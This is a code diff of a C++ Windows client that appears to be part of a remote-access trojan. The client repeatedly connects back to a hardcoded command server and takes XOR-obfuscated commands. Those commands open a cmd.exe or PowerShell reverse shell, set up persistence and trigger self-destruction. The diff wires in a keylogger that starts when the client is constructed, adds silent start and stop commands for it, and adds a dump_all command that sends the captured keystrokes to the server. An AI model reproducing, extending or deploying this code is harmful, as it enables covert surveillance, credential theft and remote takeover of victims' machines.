@@ -6,15 +6,16 @@
 #include "../inc/other.h"
 #include "../inc/Exec.h"
 #include "../inc/Destruction.h"
-#include "../inc/Keylogger.h"
+
 
 using namespace std;
 
 
 Connexion::Connexion()
 {
-    ;
-} //Constructor
+    
+    a_keylogger->setup();;
+} 
 
 
 INT Connexion::openConnexion()
@@ -27,13 +28,14 @@ INT Connexion::openConnexion()
 
     WSAStartup(MAKEWORD(2,0), &WSAData);
     
-    sock_client =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, WSA_FLAG_OVERLAPPED);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
-        
+    a_sock =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, WSA_FLAG_OVERLAPPED);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket
+    a_keylogger->setSocket(a_sock);
+
     address_client.sin_addr.s_addr= inet_addr(IP_ADDRESS);
     address_client.sin_family = AF_INET;
     address_client.sin_port = htons(PORT);
 
-    while(connect(sock_client,(SOCKADDR *)&address_client, sizeof(address_client)))
+    while(connect(a_sock,(SOCKADDR *)&address_client, sizeof(address_client)))
     {   
         Sleep(TIMEOUT_SOCK_RECONNECT);
         //Whait...;  
@@ -51,6 +53,7 @@ INT Connexion::main()
     BOOL status_destruction = FALSE; //Test if error in Destruction
     WCHAR prog[20];
 
+    
     while(TRUE)
     {
         command = recvSafe(); //Recv safe and decrypt xor
@@ -91,7 +94,7 @@ INT Connexion::main()
                     wcout << getPath() << endl;  
                 }
 
-                sendSafe(result);
+                sendCommandSafe(result);
             }
 
             else if(command.substr(0,16) == L"MOD_SPAWN_SHELL:")
@@ -102,13 +105,13 @@ INT Connexion::main()
                 if(command.substr(16, command.length()) == L"cmd.exe")
                 {
                     wcscpy(prog, L"cmd.exe");
-                    Exec().spawnSHELL(sock_client,prog);
+                    Exec().spawnSHELL(a_sock,prog);
                 }
 
                 else
                 {      
                     wcscpy(prog, L"powershell.exe");
-                    Exec().spawnSHELL(sock_client,prog);
+                    Exec().spawnSHELL(a_sock,prog);
                 }
 
             }
@@ -126,7 +129,7 @@ INT Connexion::main()
                 if(command.substr(16) == L"default") //The client sends a response to the server to report whether the persistence was successfully completed. 
                 {
                     //default persi 
-                    send(sock_client, (char *)XOREncryption(L"\r\n").c_str(), 4 ,0);    
+                    send(a_sock, (char *)XOREncryption(L"\r\n").c_str(), 4 ,0);    
                 }
                 else
                 {
@@ -154,8 +157,7 @@ INT Connexion::main()
                 if(command.substr(16,7) == L"default") //6 for default
                 {
                     //if default then send status at server. 
-                    //send default persi
-                    send(sock_client, (char *)XOREncryption(status).c_str(), status.length(), 0); //Send the statue to the server. The server will just display the status.
+                    sendSafe(status); //Send the statue to the server. The server will just display the status.
                 }
                 
                 else //else  substr(15,6) == "broadcast"
@@ -163,6 +165,8 @@ INT Connexion::main()
                     //not send status
                     ;
                 }
+
+                delete a_keylogger;
                 closeConnexion();
                 exit(0);
             }
@@ -170,17 +174,59 @@ INT Connexion::main()
             else if(command.substr(0,14) == L"MOD_KEYLOGGER:")
             {
                 wcout << "MOD_KEYLOGGER" << endl;
-                Keylogger keylogger;
-                keylogger.setup();
-                keylogger.setSocket(sock_client);
                 
                 if(command.substr(14, 10) == L"direct_tcp")
                 {
-                    keylogger.directTcp();
-                    wcout << "in Connexion !" << endl;
+                    wcout << "directcp" << endl;
+                    a_keylogger->directTcp();
+        
                 } 
-                //keylogger.~Keylogger();
+
+
+                else if(command.substr(14, 16) == L"start_silencious")
+                {
+                    wcout << " In start silencious" << endl;
+                    if(a_keylogger->silenciousStart())
+                    {
+                        //if  error
+                        status = L"MOD_KEYLOGGER:" SPLIT  "False";
+                    }
+                    else
+                    {
+                        //if not error
+                        status = L"MOD_KEYLOGGER:" SPLIT  "True";
+                    }
+                    sendSafe(status);
+                }
+
+
+                else if(command.substr(14, 15)== L"stop_silencious")
+                {
+                    wcout << "in stop_silencious" << endl;
+                    if(a_keylogger->silenciousStop())
+                    {
+                        //if error
+                        status = L"MOD_KEYLOGGER:" SPLIT "False";
+                    }
+                    else
+                    {
+                        //if not error
+                        status =  status = L"MOD_KEYLOGGER:" SPLIT "True";
+                    }
+                }
+
+
+                else if(command.substr(14, 8) == L"dump_all") 
+                {
+                  wcout << "in dump_all" << endl;
+                   vector<string> dump_all = a_keylogger->dumpAllData();
+                   sendCommandSafe(dump_all,FALSE);
+                   dump_all.clear();
+                }
+
+                wcout << "in Connexion !" << endl;
             }
+
             
             else
             {
@@ -192,8 +238,7 @@ INT Connexion::main()
                     result.push_back("\n"); //test
                     result.push_back(ConvertWideToUtf8(getPath()));
                 }
-                
-                sendSafe(result);
+                sendCommandSafe(result);
             }
         }
         command.erase(); 
@@ -210,7 +255,7 @@ wstring Connexion::recvSafe()
     INT len_recv;
     wstring result = L"";
 
-    len_recv=recv(sock_client,(char *)buffer, sizeof(buffer), 0);
+    len_recv=recv(a_sock,(char *)buffer, sizeof(buffer), 0);
         
     if(len_recv==SOCKET_ERROR)
     {
@@ -233,33 +278,47 @@ wstring Connexion::recvSafe()
 }
 
 
-VOID Connexion::sendSafe(vector<string> result_of_command)
+VOID Connexion::sendCommandSafe(vector<string> result_of_command, BOOL encryptedData)
 { /*send data and manage errors, also allows to segment the data if it is too big.
 Once the function is finished send "\r\n" to signal to the server that the client has nothing more to send. */
-    INT iResult=0;
+    INT status=0;
     INT i=0;
     INT size_all_result_of_command = 0;
     wstring request;
 
     for(i=0;i< result_of_command.size(); i++)
-    {            
-        request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));    
-        send(sock_client, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
+    {   
+        if(encryptedData)
+        {         
+            request = XOREncryption(ConvertUtf8ToWide(result_of_command[i]));    
+        }
+        else
+        {
+            request = ConvertUtf8ToWide(result_of_command[i]);
+        }
+        send(a_sock, (char *)request.c_str(),  request.length()* sizeof(WCHAR) ,0);
         wcout << "send request baby" << endl;
         Sleep(100);   
     }
         
-    iResult=send(sock_client, (char *)XOREncryption(L"\r\n").c_str() ,4 ,0); // send end communication.
-    checkSend(iResult);
+    status=send(a_sock, (char *)XOREncryption(L"\r\n").c_str() ,4 ,0); // send end communication.
+    checkSend(status);
 }
 
 
-VOID Connexion::checkSend(INT &iResult)
+VOID Connexion::sendSafe(wstring data)
+{
+    INT status = send(a_sock, (char *)XOREncryption(data).c_str(), data.length() * sizeof(WCHAR), 0);
+    checkSend(status);
+}
+
+
+VOID Connexion::checkSend(INT &status)
 {
     //Test if an error occurs when sending data 
-    if(iResult == SOCKET_ERROR)
+    if(status == SOCKET_ERROR)
     {
-        //cout << "error in sendSafe" << endl;
+        //cout << "error in sendCommandSafe" << endl;
         reConnect();
     }
 }
@@ -271,7 +330,7 @@ VOID Connexion::closeConnexion()
     // Test if it should wait after x second (s) to reconnect to the server.
 
     //"Close socket successful.
-    closesocket(sock_client);
+    closesocket(a_sock);
     WSACleanup(); //The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
 }
 
@@ -286,14 +345,14 @@ VOID Connexion::reConnect()
 
     request = L"MOD_RECONNECT" SPLIT  + a_token;
     
-    sendUltraSafe(sock_client, XOREncryption(request)); //send token
-    sendUltraSafe(sock_client, XOREncryption(L"\r\n"));
+    sendUltraSafe(a_sock, XOREncryption(request)); //send token
+    sendUltraSafe(a_sock, XOREncryption(L"\r\n"));
 }
 
 
 SOCKET Connexion::getSocket()
 {
-    return sock_client;
+    return a_sock;
 }
 
 
